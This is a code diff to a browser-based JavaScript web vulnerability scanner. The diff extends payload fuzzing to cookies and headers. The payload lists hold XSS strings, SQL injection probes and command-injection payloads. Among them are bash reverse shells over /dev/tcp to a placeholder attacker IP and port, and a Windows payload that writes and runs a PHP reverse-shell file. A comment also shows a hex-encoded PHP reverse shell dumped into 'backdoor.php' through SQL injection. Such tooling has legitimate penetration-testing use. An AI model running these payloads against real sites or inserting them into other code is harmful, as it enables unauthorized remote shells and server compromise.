@@ -23,20 +23,25 @@ function JsBugHuntingHelper () {
   this.attackerPort = ''
   this.customCookie = ''
   this.customHeaders = ''
+  this.cookiesFuzzerEnabled = false
+  this.headersFuzzerEnabled = false
 
   const previousXssAction = 'null'
   const payloadsXSS = [
-    { previousAction: previousXssAction, payloadString: '<script>alert("XSS_VULNERABLE_PARAM")</script>', expectedResult: "data.indexOf('<script>alert(\"XSS_VULNERABLE_PARAM\")</script>') !== -1 && data.indexOf('Uncaught mysqli') === -1" },
-    { previousAction: previousXssAction, payloadString: '"><script>alert("XSS_VULNERABLE_PARAM")</script><div class="', expectedResult: "data.indexOf('<script>alert(\"XSS_VULNERABLE_PARAM\")</script>') !== -1 && data.indexOf('Uncaught mysqli') === -1" },
-    { previousAction: previousXssAction, payloadString: '<svg/onload=alert("XSS_VULNERABLE_PARAM")>', expectedResult: "data.indexOf('<svg/onload=alert(\"XSS_VULNERABLE_PARAM\")>') !== -1 && data.indexOf('Uncaught mysqli') === -1" }
+    { type: 'XSS', previousAction: previousXssAction, payloadString: '<script>alert("XSS_VULNERABLE_PARAM")</script>', expectedResult: "data.indexOf('<script>alert(\"XSS_VULNERABLE_PARAM\")</script>') !== -1 && data.indexOf('Uncaught mysqli') === -1" },
+    { type: 'XSS', previousAction: previousXssAction, payloadString: '"><script>alert("XSS_VULNERABLE_PARAM")</script><div class="', expectedResult: "data.indexOf('<script>alert(\"XSS_VULNERABLE_PARAM\")</script>') !== -1 && data.indexOf('Uncaught mysqli') === -1" },
+    { type: 'XSS', previousAction: previousXssAction, payloadString: '<svg/onload=alert("XSS_VULNERABLE_PARAM")>', expectedResult: "data.indexOf('<svg/onload=alert(\"XSS_VULNERABLE_PARAM\")>') !== -1 && data.indexOf('Uncaught mysqli') === -1" }
   ]
 
   const previousErrorBasedSqliAction = 'null'
   const errorBasedSqliResult = "data.indexOf('Uncaught mysql') !== -1"
   // const unionSelectBasedSqliAction = "data.indexOf('918273645') !== -1"
   const payloadsSQLi = [
-    { previousAction: previousErrorBasedSqliAction, payloadString: '"', expectedResult: errorBasedSqliResult },
-    { previousAction: previousErrorBasedSqliAction, payloadString: "'", expectedResult: errorBasedSqliResult }
+    { type: 'SQL Injection', previousAction: previousErrorBasedSqliAction, payloadString: '"', expectedResult: errorBasedSqliResult },
+    { type: 'SQL Injection', previousAction: previousErrorBasedSqliAction, payloadString: "'", expectedResult: errorBasedSqliResult },
+    // query injection inside select statement
+    // example select $paranName from table where ecc...
+    { type: 'SQL Injection', previousAction: previousErrorBasedSqliAction, payloadString: 'concat(9182,73645)', expectedResult: "data.indexOf('918273645') !== -1" }
   ]
 
   // union based queries
@@ -82,8 +87,10 @@ function JsBugHuntingHelper () {
       // then you'll have SELECT * FROM `users` WHERE username ='Admin'/* and password=''*/
 
       // method to create shell from mysql
-      // win
+      // win inside union select
       // 0x3c3f706870206578656328222f62696e2f62617368202d63202762617368202d69203e26202f6465762f7463702f3139322e3136382e3133372e312f3232323220303e26312722293b3f3e  INTO DUMPFILE 'c:/var/www/backdoor.php'
+      // if the parameters is passed like this SELECT $POST[par],password FROM `users` WHERE id=1
+      // you can also test like this SELECT concat(9182,73645),password FROM `users` WHERE id=1
 
       for (let fq = 0; fq < sqliQuery[q].finalQuote.length; fq++) {
         const payloadWithQuotes = payload + sqliQuery[q].finalQuote[fq]
@@ -92,7 +99,7 @@ function JsBugHuntingHelper () {
           // console.log('e', e)
           const payloadWithQuotesEof = payloadWithQuotes + eof[e]
 
-          payloadsSQLi.push({ previousAction: previousErrorBasedSqliAction, payloadString: payloadWithQuotesEof, expectedResult: unionSelectSQLiResult })
+          payloadsSQLi.push({ type: 'SQL Injection', previousAction: previousErrorBasedSqliAction, payloadString: payloadWithQuotesEof, expectedResult: unionSelectSQLiResult })
         }
       }
     }
@@ -102,18 +109,18 @@ function JsBugHuntingHelper () {
   const previousRceAction = "data = data.replaceAll('echo%2BTEST_RCE','').replaceAll('echo+TEST_RCE','').replaceAll('echo TEST_RCE','').replaceAll('testRCE.php','').replaceAll(\"'TEST_RCE'\",'')"
   const genericRceResult = "data.indexOf('TEST_RCE') !== -1 && data.indexOf('Uncaught mysqli') === -1"
   const payloadsRCE = [
-    { previousAction: previousRceAction, payloadString: 'test" || echo TEST_RCE > /var/www/html/testRCE.php && cat /var/www/html/testRCE.php || "', expectedResult: genericRceResult },
-    { previousAction: previousRceAction, payloadString: 'test" || echo TEST_RCE > /var/www/testRCE.php && cat /var/www/testRCE.php || "', expectedResult: genericRceResult },
-    { previousAction: previousRceAction, payloadString: '"+%26%26+echo+TEST_RCE+%26%26+"', expectedResult: genericRceResult },
-    { previousAction: previousRceAction, payloadString: '" && echo TEST_RCE && "', expectedResult: genericRceResult },
-    { previousAction: previousRceAction, payloadString: 'echo TEST_RCE', expectedResult: genericRceResult },
-    { previousAction: previousRceAction, payloadString: '1" && echo TEST_RCE #', expectedResult: genericRceResult },
-    { previousAction: previousRceAction, payloadString: '" || echo TEST_RCE ||', expectedResult: genericRceResult },
+    { type: 'RCE', previousAction: previousRceAction, payloadString: 'test" || echo TEST_RCE > /var/www/html/testRCE.php && cat /var/www/html/testRCE.php || "', expectedResult: genericRceResult },
+    { type: 'RCE', previousAction: previousRceAction, payloadString: 'test" || echo TEST_RCE > /var/www/testRCE.php && cat /var/www/testRCE.php || "', expectedResult: genericRceResult },
+    { type: 'RCE', previousAction: previousRceAction, payloadString: '"+%26%26+echo+TEST_RCE+%26%26+"', expectedResult: genericRceResult },
+    { type: 'RCE', previousAction: previousRceAction, payloadString: '" && echo TEST_RCE && "', expectedResult: genericRceResult },
+    { type: 'RCE', previousAction: previousRceAction, payloadString: 'echo TEST_RCE', expectedResult: genericRceResult },
+    { type: 'RCE', previousAction: previousRceAction, payloadString: '1" && echo TEST_RCE #', expectedResult: genericRceResult },
+    { type: 'RCE', previousAction: previousRceAction, payloadString: '" || echo TEST_RCE ||', expectedResult: genericRceResult },
     /* Linux payload */
-    { previousAction: previousRceAction, payloadString: '1" || /bin/bash -c \'bash -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\' #', expectedResult: genericRceResult },
+    { type: 'RCE', previousAction: previousRceAction, payloadString: '1" || /bin/bash -c \'bash -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\' #', expectedResult: genericRceResult },
     // '1" || /bin/bash -c \'bash -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1'",
     /* Windows payload */
-    { previousAction: previousRceAction, payloadString: '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #', expectedResult: genericRceResult }
+    { type: 'RCE', previousAction: previousRceAction, payloadString: '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #', expectedResult: genericRceResult }
     // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php'
     // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c "bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #',
     // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #'
@@ -188,7 +195,7 @@ function JsBugHuntingHelper () {
   // eslint-disable-next-line no-multiple-empty-lines
   // eslint-disable-next-line no-unused-vars
   // @return void
-  this.init = async function (xssScanEnabled, sqlInjectionScanEnabled, rceScanEnabled, formFuzzingEnabled, attackerIp, attackerPort, customCookie, customHeaders) {
+  this.init = async function (xssScanEnabled, sqlInjectionScanEnabled, rceScanEnabled, formFuzzingEnabled, attackerIp, attackerPort, customCookie, customHeaders, cookiesFuzzerEnabled, headersFuzzerEnabled) {
     document.getElementById('openGuiButton').disabled = true
     document.getElementById('openGuiButton').innerHTML = 'Loading...'
 
@@ -199,6 +206,8 @@ function JsBugHuntingHelper () {
     this.attackerIp = attackerIp
     this.attackerPort = attackerPort
     this.customHeaders = '{}'
+    this.cookiesFuzzerEnabled = cookiesFuzzerEnabled
+    this.headersFuzzerEnabled = headersFuzzerEnabled
 
     try {
       if (customHeaders.trim() !== '') {
@@ -358,6 +367,27 @@ function JsBugHuntingHelper () {
     accordionNumber++
     gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Cookie</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">' + htmlEntities(document.cookie) + '</div></div></div>'
 
+    if (this.cookiesFuzzerEnabled === true) {
+      console.log('URL Cookies Vulnerabilities'.toUpperCase())
+
+      const cookies = await testCookies.call(this)
+      console.log(cookies)
+
+      accordionNumber++
+      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">URL Cookies Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">'
+
+      gui += '<table class="table table-responsive table-hover">'
+      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th></tr>'
+
+      cookies.forEach((v) => {
+        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td></tr>'
+      })
+
+      gui += '</table>'
+
+      gui += '</div></div></div>'
+    }
+
     console.log('----------------------------------------------------------------------------')
     console.log('\n')
 
@@ -366,6 +396,27 @@ function JsBugHuntingHelper () {
 
     accordionNumber++
     gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Headers</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">' + htmlEntities(headers) + '</div></div></div>'
+
+    if (this.headersFuzzerEnabled === true) {
+      console.log('URL Headers Vulnerabilities'.toUpperCase())
+
+      const headers = await testHeaders.call(this)
+      console.log(headers)
+
+      accordionNumber++
+      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">URL Headers Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">'
+
+      gui += '<table class="table table-responsive table-hover">'
+      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th></tr>'
+
+      headers.forEach((v) => {
+        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td></tr>'
+      })
+
+      gui += '</table>'
+
+      gui += '</div></div></div>'
+    }
 
     console.log('----------------------------------------------------------------------------')
     console.log('\n')
@@ -495,9 +546,11 @@ function JsBugHuntingHelper () {
       const params = Object.entries(JSON.parse(manualFuzzerParams))
 
       const originalParamLength = params.length
+
       let result = []
-      result = result.concat(await fuzzer.call(this, originalParamLength, manualFuzzerUrl, manualFuzzerMethod, params))
+      result = result.concat(await fuzzer.call(this, originalParamLength, manualFuzzerUrl, 'pageParams', manualFuzzerMethod, params))
       result = result.filter((v) => v.paramName !== undefined)
+
       console.log(result)
 
       let gui = ''
@@ -519,10 +572,71 @@ function JsBugHuntingHelper () {
 
       gui += '</div></div></div>'
 
+      // this is not an else if because can be more than 1 choice
+      if (this.cookiesFuzzerEnabled === true) {
+        result = []
+        result = result.concat(await fuzzer.call(this, originalParamLength, manualFuzzerUrl, 'cookiesParams', manualFuzzerMethod, params))
+        result = result.filter((v) => v.paramName !== undefined)
+
+        console.log(result)
+
+        accordionNumber++
+        gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Cookies Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">'
+
+        gui += '<table class="table table-responsive table-hover">'
+
+        gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th></tr>'
+
+        result.forEach((v) => {
+          gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td></tr>'
+        })
+
+        gui += '</table>'
+
+        gui += '</div></div></div>'
+      }
+
+      if (this.headersFuzzerEnabled === true) {
+        result = []
+        result = result.concat(await fuzzer.call(this, originalParamLength, manualFuzzerUrl, 'headersParams', manualFuzzerMethod, params))
+        result = result.filter((v) => v.paramName !== undefined)
+
+        console.log(result)
+
+        accordionNumber++
+        gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Headers Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">'
+
+        gui += '<table class="table table-responsive table-hover">'
+
+        gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th></tr>'
+
+        result.forEach((v) => {
+          gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td></tr>'
+        })
+
+        gui += '</table>'
+
+        gui += '</div></div></div>'
+      }
+
       guiEnabled(gui)
     } catch (e) {
       alert(e)
     }
+  }
+
+  function cookieToTouple () {
+    return document.cookie.split(';').map((v) => v.split('='))
+  }
+
+  function headersToTouple (headers) {
+    let headersObj = {}
+    try {
+      headersObj = JSON.parse(headers)
+    } catch (e) {
+      console.log(e)
+    }
+    return Object.entries(headersObj)
   }
 
   function guiEnabled (gui) {
@@ -828,6 +942,69 @@ function JsBugHuntingHelper () {
     }
   }
 
+  async function testCookies () {
+    const result = []
+
+    const paramsEntities = Object.entries(getAllUrlParams(document.location.href))
+    for (const payload of payloadsXSS.concat(payloadsSQLi).concat(payloadsRCE)) {
+      if ((this.xssScanEnabled === true && payload.type === 'XSS') ||
+        (this.sqlInjectionScanEnabled === true && payload.type === 'SQL Injection') ||
+        (this.rceScanEnabled === true && payload.type === 'RCE')) {
+        const url = document.location.origin + document.location.pathname
+
+        const r = await new Payload(
+          url,
+          'cookiesParams',
+          'GET',
+          paramsEntities,
+          payload.previousAction,
+          payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
+          // eslint-disable-next-line no-useless-escape
+          payload.expectedResult,
+          payload.type,
+          headersToTouple(this.customHeaders),
+          cookieToTouple()
+        ).isValidResponse()
+        if (r !== false) {
+          result.push(r)
+        }
+      }
+    }
+
+    return result
+  }
+
+  async function testHeaders () {
+    const result = []
+
+    const paramsEntities = Object.entries(getAllUrlParams(document.location.href))
+    for (const payload of payloadsXSS.concat(payloadsSQLi).concat(payloadsRCE)) {
+      if ((this.xssScanEnabled === true && payload.type === 'XSS') ||
+        (this.sqlInjectionScanEnabled === true && payload.type === 'SQL Injection') ||
+        (this.rceScanEnabled === true && payload.type === 'RCE')) {
+        const url = document.location.origin + document.location.pathname
+
+        const r = await new Payload(
+          url,
+          'headersParams',
+          'GET',
+          paramsEntities,
+          payload.previousAction,
+          payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
+          // eslint-disable-next-line no-useless-escape
+          payload.expectedResult,
+          payload.type,
+          headersToTouple(this.customHeaders),
+          cookieToTouple()
+        ).isValidResponse()
+        if (r !== false) {
+          result.push(r)
+        }
+      }
+    }
+    return result
+  }
+
   async function testXSS () {
     const result = []
     const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href))
@@ -839,6 +1016,7 @@ function JsBugHuntingHelper () {
 
         const r = await new Payload(
           newUrl2,
+          'pageParams',
           'GET',
           paramsEntities,
           payload.previousAction,
@@ -846,7 +1024,8 @@ function JsBugHuntingHelper () {
           // eslint-disable-next-line no-useless-escape
           payload.expectedResult,
           'XSS',
-          this.customHeaders
+          headersToTouple(this.customHeaders),
+          {}
         ).isValidResponse()
         if (r !== false) {
           result.push(r)
@@ -867,6 +1046,7 @@ function JsBugHuntingHelper () {
 
         const r = await new Payload(
           newUrl2,
+          'pageParams',
           'GET',
           paramsEntities,
           payload.previousAction,
@@ -874,7 +1054,8 @@ function JsBugHuntingHelper () {
           // eslint-disable-next-line no-useless-escape
           payload.expectedResult,
           'SQL Injection',
-          this.customHeaders
+          headersToTouple(this.customHeaders),
+          {}
         ).isValidResponse()
         if (r !== false) {
           result.push(r)
@@ -895,6 +1076,7 @@ function JsBugHuntingHelper () {
 
         const r = await new Payload(
           newUrl2,
+          'pageParams',
           'GET',
           paramsEntities,
           payload.previousAction,
@@ -902,7 +1084,8 @@ function JsBugHuntingHelper () {
           // eslint-disable-next-line no-useless-escape
           payload.expectedResult,
           'RCE',
-          this.customHeaders
+          headersToTouple(this.customHeaders),
+          {}
         ).isValidResponse()
         if (r !== false) {
           result.push(r)
@@ -968,69 +1151,39 @@ function JsBugHuntingHelper () {
 
       const paramsEntities = tempParams
 
-      result = result.concat(await fuzzer.call(this, originalParamsLength, url, method, paramsEntities))
+      result = result.concat(await fuzzer.call(this, originalParamsLength, url, 'pageParams', method, paramsEntities))
+      // this is not an else if because can be more than 1 choice
+      if (this.cookiesFuzzerEnabled === true) {
+        result = result.concat(await fuzzer.call(this, originalParamsLength, url, 'cookiesParams', method, paramsEntities))
+      }
+      if (this.headersFuzzerEnabled === true) {
+        result = result.concat(await fuzzer.call(this, originalParamsLength, url, 'headersParams', method, paramsEntities))
+      }
     }
     // console.log('FF', result)
     return result.filter((v) => v.paramName !== undefined)
   }
 
-  async function fuzzer (originalParamsLength, url, method, paramsEntities) {
+  async function fuzzer (originalParamsLength, url, type, method, paramsEntities) {
     const result = []
-    if (this.xssScanEnabled === true) {
-      for (let i = 0; i < originalParamsLength; i++) {
-        for (const payload of payloadsXSS) {
-          const r = await new Payload(
-            url,
-            method,
-            paramsEntities,
-            payload.previousAction,
-            payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
-            // eslint-disable-next-line no-useless-escape
-            payload.expectedResult,
-            'XSS',
-            this.customHeaders
-          ).isValidResponse()
-          if (r !== false) {
-            result.push(r)
-          }
-        }
-      }
-    }
 
-    if (this.sqlInjectionScanEnabled === true) {
-      for (let i = 0; i < originalParamsLength; i++) {
-        for (const payload of payloadsSQLi) {
+    for (let i = 0; i < originalParamsLength; i++) {
+      for (const payload of payloadsXSS.concat(payloadsSQLi).concat(payloadsRCE)) {
+        if ((this.xssScanEnabled === true && payload.type === 'XSS') ||
+        (this.sqlInjectionScanEnabled === true && payload.type === 'SQL Injection') ||
+        (this.rceScanEnabled === true && payload.type === 'RCE')) {
           const r = await new Payload(
             url,
+            type,
             method,
             paramsEntities,
             payload.previousAction,
             payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
             // eslint-disable-next-line no-useless-escape
             payload.expectedResult,
-            'SQL Injection',
-            this.customHeaders
-          ).isValidResponse()
-          if (r !== false) {
-            result.push(r)
-          }
-        }
-      }
-    }
-
-    if (this.rceScanEnabled === true) {
-      for (let i = 0; i < originalParamsLength; i++) {
-        for (const payload of payloadsRCE) {
-          const r = await new Payload(
-            url,
-            method,
-            paramsEntities,
-            payload.previousAction,
-            payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
-            // eslint-disable-next-line no-useless-escape
-            payload.expectedResult,
-            'RCE',
-            this.customHeaders
+            payload.type,
+            headersToTouple(this.customHeaders),
+            cookieToTouple()
           ).isValidResponse()
           if (r !== false) {
             result.push(r)
